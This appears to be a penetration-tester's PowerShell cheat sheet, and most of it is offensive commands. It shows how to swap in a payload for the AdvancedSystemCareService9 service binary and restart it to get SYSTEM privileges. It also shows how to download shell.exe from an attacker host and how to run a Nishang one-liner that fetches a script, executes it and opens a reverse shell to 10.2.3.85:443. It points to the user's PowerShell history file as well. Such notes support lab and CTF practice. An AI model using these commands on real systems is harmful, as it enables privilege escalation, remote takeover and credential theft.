# PowerShell

## Checking Services
```
get-service AdvancedSystemCareService9
stop-service AdvancedSystemCareService9
start-service AdvancedSystemCareService9

powershell -c get-service AdvancedSystemCareService9
powershell -c stop-service AdvancedSystemCareService9
powershell -c start-service AdvancedSystemCareService9
```

## Invoke-WebRequest
```
c:/> Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
c:/> powershell -c Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
c:/> powershell -c start-service AdvancedSystemCareService9

WOOTWOOT
c:\Windows\system32>whoami
nt authority\system
```

## New-Object System.Net.WebClient (alternate download method)
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.3.85/shell.exe','shell.exe')"
```

## Nishang Shell
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.3.85/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.3.85 -Port 443
```

## Running Executable
```
c:\> start-process shell.exe
c:\> .\shell.exe
```

## Searching for files names with PowerShell
```
Get-Childitem –Path C:\ -Include *search-string* -File -Recurse
```

 ## Decoding Base64
 ```
 $string = "some-base64 aksdjklasd=="
 [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($string))
  ```

## Reading Users PowerShell History
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```